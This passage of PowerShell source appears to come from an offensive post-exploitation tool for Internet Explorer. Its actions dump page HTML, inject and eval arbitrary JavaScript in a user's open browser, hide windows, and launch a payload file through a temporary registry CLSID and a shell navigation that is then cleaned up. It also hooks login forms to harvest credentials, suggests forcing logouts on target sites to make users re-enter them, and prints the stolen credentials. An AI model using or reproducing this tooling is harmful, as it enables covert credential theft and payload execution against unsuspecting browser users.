        if(!$gMapHwndsToCookie)
        {
            $mapHwndsToCookie = New-Object "System.Collections.Generic.Dictionary[System.Int32, System.IntPtr]"
            Set-Variable -Name "gMapHwndsToCookie" -Value $hwnds  -Scope global -Description "Maps all the Document HWNDs to the cookies on register"
        }
   }

   function RemoveHooks
   {
        if ($gShWindowsRegisteredAttached)
        {
            Unregister-Event -SourceIdentifier "ShWindowRegistered"| Out-Null
            Write-Host "[+] Unregistered Event: ShWindowRegistered"
            Unregister-Event -SourceIdentifier "ShWindowRevoked"| Out-Null
            Write-Host "[+] Unregistered Event: ShWindowRevoked"
            $gShWindowsRegisteredAttached = $false 
        }
   }

    function DumpHtml
    {
        $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
        #[ValidateSet('id','name','tagname')]
        #[String]$SelectorType,
        #[Parameter(Mandatory = $False, HelpMessage="DOM Object selector to locate, specify type in SelectorType [default is id]. Used by DumpHtml")]
        #[String]$Selector,

        if([String]::IsNullOrEmpty($Selector))
        {
           Write-Host "[!] Selector not set defaulting to the body"  
           $SelectorType = "id"
        }

        if([String]::IsNullOrEmpty($SelectorType))
        {
            Write-Host "[!] SelectorType not set defaulting to id"     
            $SelectorType = "id"
        }
        foreach($ie in $ieInstances)
        {
            switch($SelectorType)
            {
                "id"
                {
                    
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host $ie.Browser.document.body.innerHTML  
                    } else 
                    {
                        "[+] Looking for elements with ""id='$($Selector)'"" in $($ie.URL)" |out-string
                        $ielement = $ie.Browser.document.getElementById($Selector)
                        if ([bool](Get-Member -InputObject $ielement -MemberType Properties -Name "InnerHTML")){
                            write-host -ForegroundColor Green $ielement.outerHTML    
                        } else {
                            write-host "[X] Element not found"
                        }
                    }
                }
                "name"
                {
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host "[X] Selector is empty, not going to find anything"  
                    } else 
                    {
                        "[+] Looking for elements with ""name='$($Selector)'"" in $($ie.URL)" |out-string
                        $ielements = $ie.Browser.document.getElementsByName($Selector)
                        if (![bool](Get-Member -InputObject $ielements -MemberType Properties -Name "Length"))
                        {
                            write-host "[X] No elements found"
                        } else 
                        {
                            if ($ielements.Length -lt 1)
                            {
                                write-host "[X] No elements found"
                            } 
                            else 
                            {
                                foreach($elem in $ielements)
                                {
                                    if ([bool](Get-Member -InputObject $elem -MemberType Properties -Name "InnerHTML"))
                                    {
                                        write-host -ForegroundColor Green $elem.outerHTML    
                                    } 
                                    else 
                                    {
                                        write-host "[X] InnerHTML not found"    
                                    }
                                }
                            }
                        }
                    }
                }
                "tag"
                {
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host "[X] Selector is empty, not going to find anything"  
                    } else 
                    {
                        "[+] Looking for elements ""<$($Selector)>"" in $($ie.URL)" |out-string
                        $ielements = $ie.Browser.document.getElementsByTagName($Selector)
                        if (![bool](Get-Member -InputObject $ielements -MemberType Properties -Name "Length"))
                        {
                            write-host "[X] No elements found"
                        } else 
                        {
                            if ($ielements.Length -lt 1)
                            {
                                write-host "[X] No elements found"
                            } 
                            else 
                            {
                                foreach($elem in $ielements)
                                {
                                    if ([bool](Get-Member -InputObject $elem -MemberType Properties -Name "InnerHTML"))
                                    {
                                        write-host -ForegroundColor Green $elem.outerHTML    
                                    } 
                                    else 
                                    {
                                        write-host "[X] InnerHTML not found"    
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    function ChangeWindowVisibility
    {
        Param(
            [Parameter(Mandatory=$true)]
            [bool]$Visible
        )
        $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
        if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
        {
            Write-Host "[X] No IE instances found using current criteria"
        } else {
        
            Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
            if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
            {
                Write-Host "[X] No IE instances found using current criteria"
            }
            Foreach($shell in $ieInstances)
            {
                $shell.Browser.Visible = $Visible        
            } 
        }   
    }

    # Function to do the work based upon what switches have been passed
    function Dispatch 
    {
        # We have to load the whole IEFrame.dll and generate a type library unfortunately
        # Was hoping to get away without having to do this but problems occur if the 
        # Activate method is used and then the Type library is loaded
        # This will also load all the EventProxy stuff
        $ShellWindows = LoadFullIEFrame    
        
        # "ListUrls", "ExecPayload", "InvokeJS", "DumpHtml","EventHandler", "ListActions", "Help")
        switch($Action)
        {

            "Help"
            {
                Write-Host "Welcome to PowerThIEf"
                Write-Host "The following actions are supported"

            }
            "DumpHtml"
            {
                #Call the DumpHTML function above, it's too long to have in Dispatch
                DumpHtml
            }
            "ExecPayload"
            {
                if ([String]::IsNullOrEmpty($PathPayload) -or ![System.IO.File]::Exists($PathPayload))
                {
                   Write-Host "[X] -PathPayload '$($PathPayload)' can not be found" 
                }
                else 
                {
                    $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
                    if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                    {
                        Write-Host "[X] No IE instances found using current criteria"
                    } else 
                    {
                        Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                        $results = New-Object System.Collections.ArrayList
                        Foreach($shell in $ieInstances)
                        {
                            $CLSID = buildRegistrykey -Payload $PathPayload
                            Write-Host "[-] Launching payload $($PathPayload)"
                            Write-Host "shell:::{$CLSID}"
                            try
                            {
                               $shell.Browser.Navigate2("shell:::{$CLSID}", 2048)
                            }
                            catch { #Just swallow the exception if we launch cool but cleanup needs to happen
                            }
                            Write-Host "[+] Done. Sleep 5 then cleanup"
                            Start-Sleep -Seconds 5
                            cleanUpRegistry -CLSID $CLSID
                            Write-Host "[+] We outta here"
                        }
                    }
                }
            }
            "InvokeJS"
            {
                $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                } else {
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    $results = New-Object System.Collections.ArrayList
                    Foreach($shell in $ieInstances)
                    {
                        $doc = $shell.Browser.Document
                        $win = $doc.parentWindow
                        $winType = $doc.parentWindow.GetType()
                        $result = $winType.InvokeMember("eval", [System.Reflection.BindingFlags]::InvokeMethod, $null, $win, @($Script))
                        [void]$results.Add($result)
                    }
                    $results | Out-String 
                }
            }
            "ListUrls" {

                $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                } else {
                
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    $results = New-Object System.Collections.ArrayList
                    Foreach($shell in $ieInstances)
                    {
                        if ([String]::IsNullOrEmpty($Output) -Or $Output -eq "screen" )
                        {
                            $obj = select-object -InputObject $shell -Property INDEX, URL, @{Name="Visible"; Expression = {$shell.Browser.Visible}}
                            [void]$results.Add($obj)
                        }
                    }
                    $results | Out-String 
                }
            }
            "HideWindow"
            {
                ChangeWindowVisibility($false)
            }
            "ShowWindow"
            {
                ChangeWindowVisibility($true)
            }
            "NewBackgroundTab"
            {
                $ieInstances = getIEInstances -ShellWindows $ShellWindows
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                }
                else {
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    Write-Host "[-] Creating new background tab"
                    # Uses Browser interface navigate to create a new tab
                    # https://msdn.microsoft.com/en-us/library/aa752133(v=vs.85).aspx
                    # The second value passed through is navOpenInBackgroundTab (4096) from BrowserNavConstants
                    # https://msdn.microsoft.com/en-us/library/dd565688(v=vs.85).aspx
                    $ieInstances[0].Browser.Navigate2("about:blank", 4096)
                    Write-Host "[+] Done. Sleeping for 2s then will attempt to locate in ShellWindows"
                    Start-Sleep -Seconds 2
                    Write-Host "[-] Looking for new tab"
                    $ieNewInstances = getFilteredIEInstances -ShellWindows $ShellWindows
                    $newTabId = ""
                    $newTabLocated = $false
                    foreach($new in $ieNewInstances)
                    {
                        $newTabFound = $true
                        foreach($old in $ieInstances)
                        {
                            if ($new.INDEX -eq $old.INDEX)
                            {
                                $newTabFound = $false
                            }
                        }
                        if ($newTabFound)
                        {
                            if ($new.URL -eq "about:blank") {
                                $newTabLocated = $true
                                Write-Host "[+] Found. New tab index is $($new.INDEX)"
                                break    
                            }
                        }
                    }

                    if(!$newTabLocated)
                    {
                        Write-Host "[X] New tab NOT found"
                    }
                }
            }
            "HookLoginForms" {
                #Remove any hooks that are currently in
                RemoveHooks

                # Create all the tracking collections if they don't exist 
                BuildTrackingCollections

                Write-Host "[-] Checking current windows."
                foreach($shell in $gShellWindows)
                {
                    $fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
                    if ($fileName.Equals("iexplore"))
                    {
                        $hwnd = [WindowHelper]::GetHWNDFromDocument($shell.Document)
                        if ($hwnd -ne [IntPtr]::Zero)
                        {
                            $nguid = [System.Guid]::NewGuid()
                            $lgf = (new-object -TypeName LoginFormHooker -ArgumentList $shell, $nguid)
                            $gLoginFormHooker.Add($hwnd, $lgf)
                            $gKnownHwnds.Add($hwnd)
                            Write-Host "[+] Found HWND $($hwnd):$($Event.SourceArgs) hooking DocumentComplete event"
                        }
                    }
                }

                Register-ObjectEvent -InputObject $gShellWindows -EventName WindowRegistered -SourceIdentifier "ShWindowRegistered" -Action {
                    Write-Host "[+] New Window Registered, looking for it to hook"
                    #Proper dirty sleeping for 1 second but looks like it gives the Window a chance to activate properly and become focused
                    Sleep(1)
                    $focusHwnd = [WindowHelper]::GetFocusedControl()
                    foreach($shell in $gShellWindows)
                    {
                        $fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
                        if ($fileName.Equals("iexplore"))
                        {
                            $hwnd = [WindowHelper]::GetHWNDFromDocument($shell.Document)
                            Write-Host "[+] Looking for $($hwnd)"
                            if ($gKnownHwnds.Contains($hwnd))
                            {
                                Write-Host "[+] We already know bout $($hwnd)"
                            }
                            else 
                            {
                                Write-Host "[+] We don't know bout $($hwnd)"
                                if ($hwnd -ne [IntPtr]::Zero -and $hwnd -eq $focusHwnd)
                                {
                                    $gLoginFormHooker.Add($hwnd, (new-object -TypeName LoginFormHooker -ArgumentList $shell, $Event.SourceArgs))
                                    $gKnownHwnds.Add($hwnd)
                                    $gMapHwndsToCookie.($Event.SourceArgs, $hwnd)
                                    Write-Host "[+] Found HWND $($focusHwnd):$($Event.SourceArgs) hooking DocumentComplete event"
                                }    
                            }
                        }
                    }
                } | Out-Null
                Register-ObjectEvent -InputObject $gShellWindows -EventName WindowRevoked -SourceIdentifier "ShWindowRevoked" -Action {
                    # We might have caught the Window registration and have the cookie, check this first
                    Write-Host "[+] Window $(Event.SourceArgs) is closing"
                    Sleep(1)
                    if ($gMapHwndsToCookie.ContainsKey($Event.SourceArgs))
                    {
                        $clhwnd = $gMapHwndsToCookie[$Event.SourceArgs]
                        $gLoginFormHooker.Remove($clhwnd)
                    }
                    else 
                    {
                        $currHwnd = new-oject -Type "System.Collections.Generic.List[System.IntPtr]"
                        foreach($shell in $gShellWindows)
                        {
                            $fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
                            if ($fileName.Equals("iexplore"))
                            {
                                $currHwnd.Add([WindowHelper]::GetHWNDFromDocument($shell.Document))
                            }
                        }

                        foreach($knHwnd in $gKnownHwnds)
                        {
                            if(!$currHwnd.Contains($knHwnd))
                            {
                                $gLoginFormHooker.Remove($knHwnd)
                            }
                        }
                    }
                    Write-Host "[+] Window closed removing hooks"
                } | Out-Null
                Set-Variable -Name "gShWindowsRegisteredAttached" -Value $true  -Scope global -Description "Tracks all the loginformhooker objects"

                Write-Host "[+] Done now just sit back, relax and wait to collect for the creds to roll in"
                Write-Host "[!] ProTip: Why not use the InvokeJS function to trigger a logout on the target site..."
            }
            "Creds"
            {
                $creds = [LoginFormHooker]::GetCreds()
                if ($creds.Count -gt 0)
                {
                    foreach($url in $creds.Keys)
                    {
                        Write-Host "[+] Domain : $($Url)"
                        foreach ($creds in [LoginFormHooker]::GetCreds()[$Url])
                        {
                            Write-Host "`t$($creds)"
                        }
                    }
                }
                else 
                {
                    Write-host "[!] Nothing has been registered yet"
                }
            }
            "RemoveHooks"
            {
                RemoveHooks
            }
            "Navigate"
            {
                if ([string]::IsNullOrEmpty($NavigateUrl))
                {
                    Write-Host("[X] NavigateUrl is blank")
                }
                $ieInstances = getFilteredIEInstances -ShellWindows $ShellWindows
                foreach ($ie in $ieInstances)
                {
                    $ie.Browser.Navigate2($NavigateUrl)
                    Write-host "[+] Redirecting $($ie.INDEX) to $($NavigateUrl)"
                }
            }
        }
    }
    Dispatch
}